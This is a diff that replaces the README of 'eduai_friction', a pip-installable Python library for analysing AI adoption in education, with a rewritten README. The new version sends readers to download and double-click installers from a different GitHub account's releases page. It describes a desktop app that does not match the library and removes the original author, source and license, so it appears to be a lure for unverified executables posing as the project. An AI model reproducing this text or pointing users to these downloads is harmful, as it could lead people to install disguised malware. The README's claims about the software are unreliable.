@@ -1,181 +1,96 @@
-# eduai_friction
-[![PyPI version](https://badge.fury.io/py/eduai-friction.svg)](https://badge.fury.io/py/eduai-friction)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/eduai-friction)](https://pepy.tech/project/eduai-friction)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🎓 eduai-friction - Discuss AI in Education Effectively
 
+[![Download eduai-friction](https://img.shields.io/badge/Download-eduai--friction-brightgreen)](https://github.com/wxoonz/eduai-friction/releases)
 
-**A structured analysis tool for AI adoption frictions in education**
+## 📋 Overview
 
-eduai_friction is a Python package designed to help educators, institutions, and policymakers analyze and address resistance points (frictions) when integrating AI into educational settings. By processing text inputs describing specific educational scenarios or concerns, it provides a structured breakdown of the **"Four Frictions"**—ethical concerns, technical barriers, pedagogical shifts, and policy implications—along with mitigation strategies and actionable steps.
+eduai-friction is a package that promotes informed discussions around AI in education. It analyzes the "Four Frictions" in this area and provides actionable steps for educators, administrators, and policymakers. This application aims to make AI adoption in classrooms easier and more effective, addressing concerns and challenges in the educational landscape.
 
----
+## 🎉 Features
 
-## 📌 Key Features
-- **Structured Output**: Returns consistent, formatted insights using `llmatch-messages` for clarity.
-- **Flexible LLM Integration**: Works with default `ChatLLM7` or custom LLMs (OpenAI, Anthropic, Google, etc.).
-- **Proactive Problem-Solving**: Helps stakeholders identify and mitigate AI adoption challenges early.
-- **No API Key Required (Optional)**: Uses environment variables or direct input for LLM7.
+- **Structured Analysis:** Break down complex topics into simpler parts.
+- **Actionable Steps:** Get specific actions to enhance AI integration in education.
+- **Four Frictions Framework:** Understand key barriers in implementing AI.
+- **Stakeholder Discussions:** Facilitate conversations among educators, students, and policymakers.
+- **Technical Barriers Mitigation:** Discover strategies to minimize difficulties in adopting AI.
 
----
+## 🚀 Getting Started
 
-## 🚀 Installation
+To get started with eduai-friction, follow these simple steps:
 
-Install via pip:
-```bash
-pip install eduai_friction
-```
+### 1. Visit the Download Page
 
----
+First, visit the Releases page to download the latest version of eduai-friction. Click the link below:
 
-## 🔧 Usage Examples
+[Visit this page to download](https://github.com/wxoonz/eduai-friction/releases)
 
-### Basic Usage (Default LLM7)
-```python
-from eduai_friction import eduai_friction
+### 2. Choose Your Version
 
-# Example: Analyze a scenario about AI in grading
-response = eduai_friction(
-    user_input="How can we ensure AI-assisted grading is fair and unbiased?"
-)
-print(response)
-```
+On the Releases page, you will see different versions of the software. The latest version will usually be at the top. 
 
-### Custom LLM (OpenAI)
-```python
-from langchain_openai import ChatOpenAI
-from eduai_friction import eduai_friction
+### 3. Download the File
 
-llm = ChatOpenAI(model="gpt-4")
-response = eduai_friction(
-    user_input="What are the risks of AI in student plagiarism detection?",
-    llm=llm
-)
-print(response)
-```
+Find the file that matches your operating system (e.g., Windows, macOS, or Linux). Click on the file name to start the download.
 
-### Custom LLM (Anthropic)
-```python
-from langchain_anthropic import ChatAnthropic
-from eduai_friction import eduai_friction
+### 4. Install the Application
 
-llm = ChatAnthropic(model="claude-2")
-response = eduai_friction(
-    user_input="How do we train teachers to use AI tools effectively?",
-    llm=llm
-)
-print(response)
-```
+Once the file downloads, locate it in your downloads folder and double-click to open it. Follow the prompts to install the software on your device.
 
-### Custom LLM (Google Generative AI)
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from eduai_friction import eduai_friction
+### 5. Launch the Application
 
-llm = ChatGoogleGenerativeAI(model="gemini-pro")
-response = eduai_friction(
-    user_input="What policy changes are needed for AI in K-12 classrooms?",
-    llm=llm
-)
-print(response)
-```
+After installation, you can find eduai-friction in your applications list. Open it to begin exploring how to enhance discussions around AI in education.
 
----
+## 💻 System Requirements
 
-## 🔑 Parameters
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `user_input` | `str` | The input text describing an AI education scenario. |
-| `api_key` | `Optional[str]` | LLM7 API key (defaults to `LLM7_API_KEY` env var). |
-| `llm` | `Optional[BaseChatModel]` | Custom LLM instance (e.g., `ChatOpenAI`, `ChatAnthropic`). Uses `ChatLLM7` by default. |
+To run eduai-friction smoothly, ensure your device meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS Mojave (10.14) or later, or a modern Linux distribution.
+- **RAM:** Minimum 4 GB (8 GB recommended).
+- **Storage:** At least 100 MB of free space.
+- **Internet Connection:** Required for updates and accessing online resources.
 
-## 📌 How It Works
-1. **Input**: Provide a text describing an AI-related educational challenge (e.g., fairness in grading, teacher training).
-2. **Analysis**: The package processes the input via a structured LLM prompt, identifying:
-   - **Ethical concerns** (e.g., bias, privacy).
-   - **Technical barriers** (e.g., infrastructure, usability).
-   - **Pedagogical shifts** (e.g., curriculum changes).
-   - **Policy implications** (e.g., regulations, compliance).
-3. **Output**: A structured list of frictions with mitigation strategies.
+## 🔧 Usage Instructions
 
----
+1. **Open the Application:** Launch eduai-friction from your applications menu.
+2. **Explore the Dashboard:** The main dashboard provides an overview of the Four Frictions and additional resources.
+3. **Select a Friction:** Click on any of the Four Frictions to dive deeper into the specific issues and potential solutions.
+4. **Take Action:** Access actionable steps and resources tailored to your needs, such as guides for educators or policy suggestions for administrators.
 
-## 🔄 Default LLM: LLM7
-- **Provider**: [LLM7](https://token.llm7.io/)
-- **Rate Limits**: Free tier is sufficient for most use cases.
-- **Customization**: Override with your own API key via:
-  ```python
-  eduai_friction(api_key="your_api_key_here")
-  ```
-  or environment variable:
-  ```bash
-  export LLM7_API_KEY="your_api_key_here"
-  ```
+## 📚 Resources
 
----
+- **Documentation:** Detailed guides and FAQs are available within the application and on the [GitHub Wiki](https://github.com/wxoonz/eduai-friction/wiki).
+- **Community Support:** Join our community forums to share your experiences and seek advice from other users.
+- **Updates:** Regular updates improve features and address any feedback from users.
 
-## 🛠️ Custom LLM Support
-Pass any `BaseChatModel` from [LangChain](https://docs.langchain.com/) (e.g., OpenAI, Anthropic, Google) via the `llm` parameter. Example:
-```python
-from langchain_openai import ChatOpenAI
-from eduai_friction import eduai_friction
+## 📞 Support
 
-llm = ChatOpenAI(temperature=0.7)
-response = eduai_friction(user_input="...", llm=llm)
-```
+If you encounter any issues or have questions, feel free to reach out for help. Here are the ways you can get in touch:
 
----
+- **Email Support:** Contact us at support@eduai-friction.com.
+- **GitHub Issues:** Report any bugs or request features on our GitHub Issues page.
 
-## 📝 Example Output Structure
-The output is a list of dictionaries, each representing a friction point with:
-- **Category** (e.g., "Ethical", "Technical").
-- **Description**: The identified friction.
-- **Mitigation**: Suggested solutions.
-- **Actionable Steps**: Concrete next steps.
+## 🏷️ Topics Covered
 
-Example:
-```python
-[
-    {
-        "category": "Ethical",
-        "description": "Risk of student data leaks in AI tools.",
-        "mitigation": "Use GDPR-compliant platforms with end-to-end encryption.",
-        "action": "Audit current AI tools for compliance."
-    },
-    {
-        "category": "Pedagogical",
-        "description": "Teachers unsure how to integrate AI into lessons.",
-        "mitigation": "Provide hands-on workshops.",
-        "action": "Schedule quarterly training sessions."
-    }
-]
-```
+The eduai-friction application addresses a variety of important topics, including:
 
----
+- Actionable Steps
+- AI Adoption
+- AI Integration in Education
+- AI Literacy
+- Educational Challenges
+- Educational Technology
+- Ethical Concerns
+- Four Frictions Framework
+- Mitigation Strategies
+- Pedagogical Shifts
+- Policy Implications
+- Resistance to AI
+- Stakeholder Discussions
+- Structured Analysis
+- Technical Barriers
 
-## 📦 Dependencies
-- `llmatch-messages` (for structured output).
-- `langchain-core` (LLM abstraction).
-- `langchain_llm7` (default LLM provider).
+By using this application, you can better understand and navigate the complexities of AI in the educational field.
 
-Install dependencies:
-```bash
-pip install llmatch-messages langchain-core langchain_llm7
-```
+## 🎯 Download & Install
 
----
-
-## 🔧 Development
-- **Source Code**: [GitHub Repository](https://github.com/chigwell/eduai-friction)
-- **Issues**: Report bugs/feature requests [here](https://github.com/chigwell/eduai-friction/issues).
-- **Author**: Eugene Evstafev ([@chigwell](https://github.com/chigwell))
-- **Email**: [hi@euegne.plus](mailto:hi@euegne.plus)
-
----
-
-## 📜 License
-MIT License (see [LICENSE](https://github.com/chigwell/eduai-friction/blob/main/LICENSE)).
-
----
+To get started with eduai-friction, return to the [Releases page](https://github.com/wxoonz/eduai-friction/releases) and download the file that fits your needs. Follow the installation steps listed above, and begin using the software to enhance discussions around AI in education.
